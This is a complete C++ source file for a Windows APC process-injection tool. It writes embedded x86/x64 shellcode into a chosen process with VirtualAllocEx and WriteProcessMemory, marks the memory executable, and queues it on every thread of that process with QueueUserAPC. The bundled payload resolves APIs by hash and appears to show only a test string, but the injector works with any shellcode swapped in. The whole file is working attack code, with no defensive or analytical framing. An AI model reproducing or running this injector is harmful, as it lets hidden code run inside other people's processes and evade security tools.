#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <iostream>

#if defined(_M_X64) // _M_AMD64
unsigned char hexData[376] = {
    0xE9, 0x0B, 0x01, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
    0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x41, 0x57, 0x65,
    0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x44, 0x8B, 0xF9, 0x48, 0x8B, 0x50, 0x18, 0x4C,
    0x8B, 0x72, 0x20, 0x4D, 0x8B, 0xC6, 0x4D, 0x8B, 0x48, 0x20, 0x4D, 0x8B, 0x00, 0x4D, 0x85, 0xC9,
    0x0F, 0x84, 0x89, 0x00, 0x00, 0x00, 0x49, 0x63, 0x41, 0x3C, 0x42, 0x8B, 0x8C, 0x08, 0x88, 0x00,
    0x00, 0x00, 0x85, 0xC9, 0x74, 0x79, 0x4D, 0x8D, 0x14, 0x09, 0x41, 0x8B, 0x52, 0x0C, 0x49, 0x03,
    0xD1, 0x33, 0xFF, 0xEB, 0x16, 0xC1, 0xCF, 0x0D, 0x41, 0x0F, 0xBE, 0xCB, 0x41, 0x80, 0xFB, 0x61,
    0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF8, 0x48, 0xFF, 0xC2, 0x44, 0x8A, 0x1A, 0x45, 0x84,
    0xDB, 0x75, 0xE2, 0x41, 0x8B, 0x52, 0x20, 0x45, 0x33, 0xDB, 0x49, 0x03, 0xD1, 0x45, 0x39, 0x5A,
    0x18, 0x76, 0x3C, 0x8B, 0x1A, 0x49, 0x03, 0xD9, 0x33, 0xF6, 0xEB, 0x16, 0xC1, 0xCE, 0x0D, 0x40,
    0x0F, 0xBE, 0xCD, 0x40, 0x80, 0xFD, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03, 0xF0, 0x48,
    0xFF, 0xC3, 0x40, 0x8A, 0x2B, 0x40, 0x84, 0xED, 0x75, 0xE2, 0x8D, 0x04, 0x37, 0x44, 0x3B, 0xF8,
    0x74, 0x31, 0x41, 0xFF, 0xC3, 0x48, 0x83, 0xC2, 0x04, 0x45, 0x3B, 0x5A, 0x18, 0x72, 0xC4, 0x4D,
    0x3B, 0xC6, 0x0F, 0x85, 0x5E, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x18, 0x48,
    0x8B, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x8B, 0x7C, 0x24, 0x30, 0x41, 0x5F,
    0x41, 0x5E, 0xC3, 0x41, 0x8B, 0x4A, 0x24, 0x49, 0x03, 0xC9, 0x46, 0x0F, 0xB7, 0x04, 0x59, 0x41,
    0x8B, 0x4A, 0x1C, 0x49, 0x03, 0xC9, 0x42, 0x8B, 0x04, 0x81, 0x49, 0x03, 0xC1, 0xEB, 0xCB, 0xCC,
    0x40, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x40, 0xB9, 0x8D, 0x10, 0xB7, 0xF8, 0xC7, 0x45,
    0xE0, 0x75, 0x73, 0x65, 0x72, 0xC7, 0x45, 0xE4, 0x33, 0x32, 0x2E, 0x64, 0x66, 0xC7, 0x45, 0xE8,
    0x6C, 0x6C, 0xC6, 0x45, 0xEA, 0x00, 0xC7, 0x45, 0xF0, 0x5B, 0x64, 0x62, 0x5D, 0xC7, 0x45, 0xF4,
    0x20, 0x68, 0x65, 0x6C, 0xC7, 0x45, 0xF8, 0x6C, 0x20, 0x74, 0x65, 0x66, 0xC7, 0x45, 0xFC, 0x73,
    0x74, 0xC6, 0x45, 0xFE, 0x00, 0xE8, 0xAE, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4D, 0xE0, 0xFF, 0xD0,
    0xB9, 0xB6, 0x5E, 0x15, 0x44, 0xE8, 0x9E, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x4D, 0xF0, 0xFF, 0xD0,
    0x33, 0xC0, 0x48, 0x83, 0xC4, 0x40, 0x5D, 0xC3 
};

#else
unsigned char hexData[299] = {
    0xE8, 0xC5, 0x00, 0x00, 0x00, 0xC2, 0x04, 0x00, 0x53, 0x56, 0x8B, 0xF1, 0x33, 0xD2, 0xEB, 0x12,
    0x0F, 0xBE, 0xCB, 0xC1, 0xCA, 0x0D, 0x80, 0xFB, 0x61, 0x8D, 0x41, 0xE0, 0x0F, 0x4C, 0xC1, 0x03,
    0xD0, 0x46, 0x8A, 0x1E, 0x84, 0xDB, 0x75, 0xE8, 0x5E, 0x8B, 0xC2, 0x5B, 0xC3, 0x55, 0x8B, 0xEC,
    0x83, 0xEC, 0x14, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8B, 0x40, 0x0C, 0x89,
    0x4D, 0xF4, 0x8B, 0x40, 0x14, 0x8B, 0xF8, 0x89, 0x45, 0xEC, 0x8B, 0x77, 0x10, 0x8B, 0x3F, 0x85,
    0xF6, 0x74, 0x4F, 0x8B, 0x46, 0x3C, 0x8B, 0x5C, 0x30, 0x78, 0x85, 0xDB, 0x74, 0x44, 0x8B, 0x4C,
    0x33, 0x0C, 0x03, 0xCE, 0xE8, 0x9F, 0xFF, 0xFF, 0xFF, 0x8B, 0x4C, 0x33, 0x20, 0x89, 0x45, 0xF8,
    0x03, 0xCE, 0x33, 0xC0, 0x89, 0x4D, 0xF0, 0x89, 0x45, 0xFC, 0x39, 0x44, 0x33, 0x18, 0x76, 0x22,
    0x8B, 0x0C, 0x81, 0x03, 0xCE, 0xE8, 0x7E, 0xFF, 0xFF, 0xFF, 0x03, 0x45, 0xF8, 0x39, 0x45, 0xF4,
    0x74, 0x1C, 0x8B, 0x45, 0xFC, 0x8B, 0x4D, 0xF0, 0x40, 0x89, 0x45, 0xFC, 0x3B, 0x44, 0x33, 0x18,
    0x72, 0xDE, 0x3B, 0x7D, 0xEC, 0x75, 0xA3, 0x33, 0xC0, 0x5F, 0x5E, 0x5B, 0xC9, 0xC3, 0x8B, 0x4D,
    0xFC, 0x8B, 0x44, 0x33, 0x24, 0x8D, 0x04, 0x48, 0x0F, 0xB7, 0x0C, 0x30, 0x8B, 0x44, 0x33, 0x1C,
    0x8D, 0x04, 0x88, 0x8B, 0x04, 0x30, 0x03, 0xC6, 0xEB, 0xDF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x1C,
    0xB9, 0x8D, 0x10, 0xB7, 0xF8, 0xC7, 0x45, 0xF4, 0x75, 0x73, 0x65, 0x72, 0xC7, 0x45, 0xF8, 0x33,
    0x32, 0x2E, 0x64, 0x66, 0xC7, 0x45, 0xFC, 0x6C, 0x6C, 0xC6, 0x45, 0xFE, 0x00, 0xC7, 0x45, 0xE4,
    0x5B, 0x64, 0x62, 0x5D, 0xC7, 0x45, 0xE8, 0x20, 0x68, 0x65, 0x6C, 0xC7, 0x45, 0xEC, 0x6C, 0x20,
    0x74, 0x65, 0x66, 0xC7, 0x45, 0xF0, 0x73, 0x74, 0xC6, 0x45, 0xF2, 0x00, 0xE8, 0x1C, 0xFF, 0xFF,
    0xFF, 0x8D, 0x4D, 0xF4, 0x51, 0xFF, 0xD0, 0xB9, 0xB6, 0x5E, 0x15, 0x44, 0xE8, 0x0C, 0xFF, 0xFF,
    0xFF, 0x8D, 0x4D, 0xE4, 0x51, 0xFF, 0xD0, 0x33, 0xC0, 0xC9, 0xC3 
};
#endif

BOOL FindProcessThtreadsById(DWORD pid, std::vector<DWORD>& tids) {
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE; 
    THREADENTRY32 te32; 

    // Take a snapshot of all running threads
    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); 
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        return FALSE; 
    }

    // Fill in the size of the structure before using it. 
    te32.dwSize = sizeof(THREADENTRY32);

    // Retrieve information about the first thread,
    // and exit if unsuccessful
    if(!Thread32First(hThreadSnap, &te32)) 
    {
        std::cout << "[-] Thread32First failed, error code: " << GetLastError() << std::endl;
        CloseHandle(hThreadSnap);          // clean the snapshot object
        return FALSE;
    }

    // Now walk the thread list of the system,
    // and display information about each thread
    // associated with the specified process
    do 
    { 
        if( te32.th32OwnerProcessID == pid )
        {
            tids.push_back(te32.th32ThreadID);
        }
    } while(Thread32Next(hThreadSnap, &te32)); 
    CloseHandle( hThreadSnap );
	return TRUE;
}

int FindProcessImangeBaseAddressById(DWORD pid, LPVOID& hBaseAddress)
{
    HANDLE hModuleSnap = INVALID_HANDLE_VALUE; 
    MODULEENTRY32 me32;

    //  Take a snapshot of all modules in the specified process. 
    hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, pid ); 
    if( hModuleSnap == INVALID_HANDLE_VALUE ) 
    { 
        return -1; 
    }

    //  Set the size of the structure before using it. 
    me32.dwSize = sizeof( MODULEENTRY32 ); 
 
    //  Retrieve information about the first module, 
    //  and exit if unsuccessful 
    if( !Module32First(hModuleSnap, &me32 )) 
    { 
        CloseHandle( hModuleSnap );     // Must clean up the snapshot object! 
        return -1; 
    }

    // do 
    // {
    //     std::cout << me32.szModule << std::endl;
    //     // _tprintf( TEXT("\n\n     MODULE NAME:     %s"),             me32.szModule ); 
    //     // _tprintf( TEXT("\n     executable     = %s"),             me32.szExePath ); 
    //     // _tprintf( TEXT("\n     process ID     = 0x%08X"),         me32.th32ProcessID ); 
    //     // _tprintf( TEXT("\n     ref count (g)  =     0x%04X"),     me32.GlblcntUsage ); 
    //     // _tprintf( TEXT("\n     ref count (p)  =     0x%04X"),     me32.ProccntUsage ); 
    //     // _tprintf( TEXT("\n     base address   = 0x%08X"), (DWORD) me32.modBaseAddr ); 
    //     // _tprintf( TEXT("\n     base size      = %d"),             me32.modBaseSize ); 
    // } while( Module32Next(hModuleSnap, &me32));
    hBaseAddress = me32.modBaseAddr;
    CloseHandle( hModuleSnap ); 
    return 0;
}

int ApcInject(DWORD pid, char* shellcode, int length){
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
	LPVOID baseAddress = nullptr;
	DWORD oldProtect = 0;
	PAPCFUNC pfnApc;
    DWORD ret = 0;
    std::vector<DWORD> tids;

    // Find target process threads
    if (!FindProcessThtreadsById(pid, tids)){
        goto end;
    }
    
    // Find target proces by Id
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == INVALID_HANDLE_VALUE){
        std::cout << "[-] open process failed, error code: " << GetLastError() << std::endl;
        goto end;
    }
    std::cout << "[+] find target thread count: " << tids.size() << std::endl;

    // Allocating memory in remote process with protection PAGE_READWRITE
    std::cout << "[+] allocate memory in target process" << std::endl;
	baseAddress = VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (baseAddress == nullptr){
        std::cout << "[-] allocate memory failed, error code: " << GetLastError() << std::endl;
		goto cleanup;
    }
    std::cout << "[+] remote memory allocated at address: " << baseAddress << std::endl;

    // Write shellcode to remote process memory
	if (!WriteProcessMemory(hProcess, baseAddress, shellcode, length, NULL)) {
        std::cout << "[-] error writing payload into the remote rocess, error code: " << GetLastError() << std::endl;
		goto cleanup;
	}

    // Changing memory protection of allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ
    std::cout << "[+] changing memory protection RW -> RX" << std::endl;
	if (!VirtualProtectEx(hProcess, baseAddress, length, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cout << "[-] error changing memory protection, error code: " << GetLastError() << std::endl;
		goto cleanup;
	}

    //getchar();
    // Setting up the routine (APC routine)
    pfnApc = (PAPCFUNC)baseAddress;
	// Put our payload/APC function in queue
    for (auto tid : tids){
       hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, tid);
       if (hThread){
            if (!QueueUserAPC(pfnApc, hThread, 0)){
                std::cout << "[-] error QueueUserAPC, error code: " << GetLastError()  << ", thread id: " << tid << std::endl;
            }else{
                std::cout << "[+] QueueUserAPC success, thread id: " << "thread id: " << tid << std::endl;
            }
            SuspendThread(hThread);
            ResumeThread(hThread);
            CloseHandle(hThread);
       }
    }

cleanup:
    CloseHandle(hProcess);
end:

    return 0;
}

int main(int argc, char** argv) {
    if (argc != 2){
        std::cout << "[+] apcinject <pid>" << std::endl;
        return -1;
    }

#if defined(_M_X64) // _M_AMD64
    std::cout << "[+] this is x64 platform" << std::endl;
#else
    std::cout << "[+] this is x86 platform" << std::endl;
#endif

    DWORD pid = atoi(argv[1]);
    ApcInject(pid, (char*)hexData, sizeof(hexData));

    //getchar();
}